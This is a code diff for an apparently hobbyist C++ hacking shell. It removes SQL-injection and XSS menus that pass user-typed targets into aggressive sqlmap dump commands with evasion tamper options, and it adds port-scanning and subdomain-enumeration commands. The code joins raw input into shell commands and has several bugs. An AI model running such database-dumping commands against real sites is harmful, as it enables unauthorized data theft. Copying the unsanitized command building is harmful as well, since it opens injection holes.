@@ -89,206 +89,7 @@ class Start {
 	    	} catch (json::exception& e) {
 	    		log.warn("HIT -> " + std::string(e.what()));
 	    	}
-	    }
-		//
-		// QL = SQL
-		//
-		void QLDefault() {
-			log.info("'QLDefault' successfully executed!.");
-			std::string input;
-			std::cout << "input target# ";
-			if (!(std::getline(std::cin, input))) return;
-
-			if (input.empty()) {
-				log.warn("user did not provide correct input");
-				opt.warn("input cannot be empty!");
-				return;
-			}
-
-			log.debug("user entered input" + input);
-			scan(("nmap " + input).c_str());
-		}
-		
-		void QLStart() {
-			log.info("'QLStart' successfully executed!.");
-			std::string input;
-			Message::Sql::Sql();
-			std::cout << "[" << "\e[31m" << "root" << "\e[37m" <<"@intip/module/sql] ~# ";
-			std::getline(std::cin, input);
-
-			if (input == "1") {
-				log.info("Input user successfully executed!");
-				std::string target;
-				Message::Sql::Menu();
-				std::cout << "[" << "\e[31m" << "root" << "\e[37m" << "@intip/module/sql] ~# ";
-				std::getline(std::cin, target);
-
-				if (target == "1") {
-					std::string target;
-					std::cout << "[" << "\e[31m" << "root" << "\e[37m" << "@intip/module/sql] ~/target# ";
-					std::getline(std::cin, target);
-					
-					if (!target.empty()) {
-						std::string cmd = "sqlmap -u " + target + "--batch --dbs --tamper=space2comment,between,default --hex --level 5 --risk 3 -v 3";
-
-						log.info("running sqlmap with cli " + cmd);
-
-						int result = Engine::Command::exec(cmd);
-
-						if (result != 0) {
-							Message::Sql::Error();
-						}
-					} else {
-						Message::Error::ErrorInput();
-					}
-					
-				} else if (input == "2") {
-					std::string target;
-					std::cout << "[" << "\e[31m" << "root" << "\e[37m" << "@intip/module/sql] ~/custom# ";
-					std::getline(std::cin, target);
-
-					if (!target.empty()) {
-						std::string cmd;
-
-						if (cmd.find("sqlmap") == std::string::npos) {
-							cmd = "sqlmap " + target;
-
-							log.info("Engime started!, successully called engine");
-
-							int result = Engine::Command::exec(cmd);
-
-							if (result != 0) {
-								Message::Sql::Error();
-								log.debug("Engine Hitting something.. ");
-							}
-							
-						} else {
-							cmd = target;
-						}
-
-						// Engine::Command::exec(cmd);
-					} else {
-						Message::Error::ErrorInput();
-					}
-					
-				} else if (input == "3") {
-					Message::Updater::UpdateML();
-				}
-					
-			} else if (input == "2") {
-				Message::Updater::UpdateSC();
-			} else {
-				Message::Error::ErrorInput();
-			}
-		}
-
-		void QLdump() {
-			std::string target;
-			Message::Sql::dumpSql();
-			std::cout << "[" << "\e[31m" << "root" << "\e[37m" << "@intip/module/sqlDump] ~# ";
-			std::getline(std::cin, target);
-
-			if (target == "1") {
-				std::string target;
-				std::string db;
-				// log.info("\nPlease input the target")
-	 			std::cout << "[" << "\e[31m" << "root" << "\e[37m" << "@intip/module/sqlDump] ~/target# ";
-	 			// log.info("\nPlease input the database")
-				std::getline(std::cin, target);
-	 			std::cout << "[" << "\e[31m" << "root" << "\e[37m" << "@intip/module/sqlDump] ~/database# ";
-				std::getline(std::cin, target);
-
-				if (!target.empty()) {
-					std::string cmd = "sqlmap -u " + target + "--batch -D " + db + " --dump --risk 3 --level 5 --tamper=space2comment --thread 10 --random-agent";
-
-					log.info("Engine started, successfully called function");
-					
-					Engine::Command::exec(cmd);
-
-					// if (cmd != 0) {
-						// Message::Sql::Error();
-						// log.debug("Engine hitting something...");
-					// }
-					
-				} else {
-					Message::Error::ErrorInput();
-					log.warn("Message::Error::ErrorInput(); : Warning user entered wrong output");
-				}
-				
-			} else if (target == "2") {
-				std::string target;
-				std::string db;
-	 			std::cout << "[" << "\e[31m" << "root" << "\e[37m" << "@intip/module/sqlDump] ~/target# ";
-				std::getline(std::cin, target);
-	 			std::cout << "[" << "\e[31m" << "root" << "\e[37m" << "@intip/module/sqlDump] ~/database# ";
-				std::getline(std::cin, target);
-
-				if (!target.empty()) {
-					std::string cmd = "sqlmap -u " + target + "--batch -D " + db + " --dump-all --risk 3 --level 5 --tamper=space2comment --thread 10 --random-agent";
-					Engine::Command::exec(cmd);
-				} else {
-					Message::Error::ErrorInput();
-				}
-				
-			} else if (target == "3") {
-				std::string target;
-				std::string db;
-				std::string table;
-				std::string column;
-	 			std::cout << "[" << "\e[31m" << "root" << "\e[37m" << "@intip/module/sqlDump] ~/target# ";
-				std::getline(std::cin, target);
-	 			std::cout << "[" << "\e[31m" << "root" << "\e[37m" << "@intip/module/sqlDump] ~/database# ";
-				std::getline(std::cin, target);
-	 			std::cout << "[" << "\e[31m" << "root" << "\e[37m" << "@intip/module/sqlDump] ~/table# ";
-				std::getline(std::cin, target);
-	 			std::cout << "[" << "\e[31m" << "root" << "\e[37m" << "@intip/module/sqlDump] ~/column# ";
-				std::getline(std::cin, target);
-
-				if (!target.empty()) {
-					std::string cmd = "sqlmap -u " + target + "--batch -D " + db + " --dump-all --risk 3 --level 5 --tamper=space2comment --thread 10 --random-agent";
-					Engine::Command::exec(cmd);
-				} else {
-					Message::Error::ErrorInput();
-				}
-			} else if (target == "4") {
-				std::string target;
-				std::string db;
-				std::string table;
-
-				std::cout << "[" << "\e[31m" << "root" << "\e[37m" << "@intip/module/sqlDump] ~/target# ";
-				std::getline(std::cin, target);
-	 			std::cout << "[" << "\e[31m" << "root" << "\e[37m" << "@intip/module/sqlDump] ~/database# ";
-				std::getline(std::cin, target);
-	 			std::cout << "[" << "\e[31m" << "root" << "\e[37m" << "@intip/module/sqlDump] ~/table# ";
-				std::getline(std::cin, target);
-
-				if (!target.empty()) {
-
-				}
-			}
-		}
-
-		// xss ssection
-		void XSStart() {
-			Message::Xss::Menu();
-		}
-
-		void XSSdetect() {
-			Message::Xss::Warn();
-		}
-
-		void XSSMenu()	{
-			Message::Xss::Menu();
-			std::string input;
-			std::cout << "[" << "\e[31m" << "root" << "\e[37m" << "@intip/module/xss] ~# ";
-			std::getline(std::cin, input);
-
-			if (input == "1") {
-				std::cout << "kontolodon" << std::endl;
-			} else {
-				Message::Error::Global();
-			}
-		}
+	    }		
 };
 
 int main() {
@@ -325,23 +126,26 @@ int main() {
         } 
         else if (userInput == "help sql") {
             log.debug("Executing help sql command");
-            Message::Default::showSql();
-        } 
-        else if (userInput == "sql") {
-			Auto::Exec::PortScanner::start("jmbot");
+		}
+        else if (userInput == "port") {
+			std::string target;
+			std::cout << "[\033[31mroot\033[37m@intip]~/target# ";
+
+			std::getline(std::cin, target);
+
+			Auto::Exec::PortScanner::start(target);
 			Auto::Exec::PortScanner::end();
-            shell.QLDefault();
-        } 
-        else if (userInput == "sql start") {
-            shell.QLStart();
-        } 
-        else if (userInput == "xss" || userInput == "xss help") {
-            shell.XSStart();
-        } 
-        else if (userInput == "xss url") {
-            shell.XSSMenu();
-        } 
-        else if (userInput == "cls" || userInput == "clear") {
+        }
+		else if (userInput == "subdo") {
+			std::string target;
+			std::cout << "[\033[31mroot\033[37m@intip]~/target# ";
+
+			std::getline(std::cin, target);
+
+			Auto::Exec::SubdomainEnum::start(target);
+			Auto::Exec::SubdomainEnum::end();
+		}
+     	else if (userInput == "clear") {
             Engine::Command::exec("clear");
             banner();
         } 
